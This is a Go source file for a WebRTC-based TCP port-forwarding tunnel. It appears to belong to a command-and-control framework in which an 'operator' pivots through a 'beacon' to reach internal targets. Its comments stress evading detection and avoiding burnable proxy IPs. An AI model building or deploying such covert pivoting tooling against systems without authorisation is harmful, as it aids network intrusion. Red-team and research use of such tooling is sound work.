// Package tunnel provides direct TCP forward tunnels over WebRTC data channels.
// Instead of SOCKS5 proxies (which are detectable and require proxy software),
// this creates raw TCP forwarders — like SSH -L style port forwarding.
// The operator sets up a local listener, any connection gets wrapped in
// WebRTC data channel messages, and the beacon bridges to the real target.
//
// No proxy protocol. No proxychains. No middleman IPs to burn.
// Just clean TCP over encrypted WebRTC.

package tunnel

import (
	"fmt"
	"io"
	"log"
	"net"
	"sync"
	"time"
)

// TunnelID uniquely identifies a tunnel connection.
type TunnelID string

// TunnelConn represents one proxied connection through the tunnel.
type TunnelConn struct {
	ID      TunnelID
	Target  string // host:port
	Conn    net.Conn
	Created time.Time
}

// Bridge tracks active tunnel connections and routes data between
// local sockets and the WebRTC data channel.
type Bridge struct {
	OnData  func(tunnelID TunnelID, data []byte)
	OnClose func(tunnelID TunnelID)
	mu      sync.RWMutex
	conns   map[TunnelID]*TunnelConn
}

// NewBridge creates a new tunnel bridge.
func NewBridge() *Bridge {
	return &Bridge{
		conns: make(map[TunnelID]*TunnelConn),
	}
}

// ForwardHandle accepts a raw TCP connection and tunnels it through
// the WebRTC data channel to the specified target (reaches via beacon).
// No SOCKS handshake — just pure TCP over WebRTC.
func (b *Bridge) ForwardHandle(client net.Conn, target string, tunnelID TunnelID) {
	defer client.Close()

	log.Printf("[tunnel] forward: %s -> %s", tunnelID, target)

	tc := &TunnelConn{
		ID:      tunnelID,
		Target:  target,
		Created: time.Now(),
	}

	b.mu.Lock()
	b.conns[tunnelID] = tc
	b.mu.Unlock()

	defer func() {
		b.mu.Lock()
		delete(b.conns, tunnelID)
		b.mu.Unlock()
	}()

	// Send tunnel open request to beacon
	if b.OnData != nil {
		b.OnData(tunnelID, []byte(fmt.Sprintf("OPEN:%s", target)))
	}

	// Bridge: local -> WebRTC tunnel
	buf := make([]byte, 16384)
	for {
		client.SetReadDeadline(time.Now().Add(30 * time.Second))
		n, err := client.Read(buf)
		if err != nil {
			if err != io.EOF && !isNetTimeout(err) {
				log.Printf("[tunnel] read error on %s: %v", tunnelID, err)
			}
			break
		}
		if b.OnData != nil {
			b.OnData(tunnelID, buf[:n])
		}
	}

	// Tell beacon to close this tunnel
	if b.OnData != nil {
		b.OnData(tunnelID, []byte("CLOSE"))
	}
}

// HandleData processes incoming tunnel data from the beacon
// and writes it to the local connection.
func (b *Bridge) HandleData(tunnelID TunnelID, data []byte) {
	b.mu.RLock()
	tc, ok := b.conns[tunnelID]
	b.mu.RUnlock()

	if !ok || tc.Conn == nil {
		return
	}

	if _, err := tc.Conn.Write(data); err != nil {
		log.Printf("[tunnel] write error on %s: %v", tunnelID, err)
	}
}

// CloseTunnel closes a specific tunnel connection.
func (b *Bridge) CloseTunnel(tunnelID TunnelID) {
	b.mu.Lock()
	tc, ok := b.conns[tunnelID]
	delete(b.conns, tunnelID)
	b.mu.Unlock()

	if ok && tc.Conn != nil {
		tc.Conn.Close()
	}
}

// CloseAll closes all tunnel connections.
func (b *Bridge) CloseAll() {
	b.mu.Lock()
	defer b.mu.Unlock()

	for id, tc := range b.conns {
		if tc.Conn != nil {
			tc.Conn.Close()
		}
		delete(b.conns, id)
	}
}

// ForwardListener manages a single port forward mapping.
type ForwardListener struct {
	LocalAddr  string
	TargetAddr string
	TunnelID   string
	listener   net.Listener
	bridge     *Bridge
	running    bool
	mu         sync.Mutex
}

// StartForwardListener creates and starts a direct TCP forward listener.
func (b *Bridge) StartForwardListener(localAddr, targetAddr string) (*ForwardListener, error) {
	listener, err := net.Listen("tcp", localAddr)
	if err != nil {
		return nil, fmt.Errorf("forward listen on %s: %w", localAddr, err)
	}

	fl := &ForwardListener{
		LocalAddr:  localAddr,
		TargetAddr: targetAddr,
		TunnelID:   fmt.Sprintf("fwd-%s-%s", localAddr, targetAddr),
		listener:   listener,
		bridge:     b,
		running:    true,
	}

	go func() {
		connID := 0
		for {
			conn, err := listener.Accept()
			if err != nil {
				fl.mu.Lock()
				if !fl.running {
					fl.mu.Unlock()
					return
				}
				fl.mu.Unlock()
				log.Printf("[forward] accept error on %s: %v", localAddr, err)
				return
			}
			connID++
			tid := TunnelID(fmt.Sprintf("%s-%d", fl.TunnelID, connID))
			go b.ForwardHandle(conn, targetAddr, tid)
		}
	}()

	log.Printf("[forward] %s -> %s (via beacon)", localAddr, targetAddr)
	return fl, nil
}

// Stop shuts down the forward listener.
func (fl *ForwardListener) Stop() {
	fl.mu.Lock()
	fl.running = false
	if fl.listener != nil {
		fl.listener.Close()
	}
	fl.mu.Unlock()
	log.Printf("[forward] stopped %s -> %s", fl.LocalAddr, fl.TargetAddr)
}

func isNetTimeout(err error) bool {
	if netErr, ok := err.(net.Error); ok {
		return netErr.Timeout()
	}
	return false
}
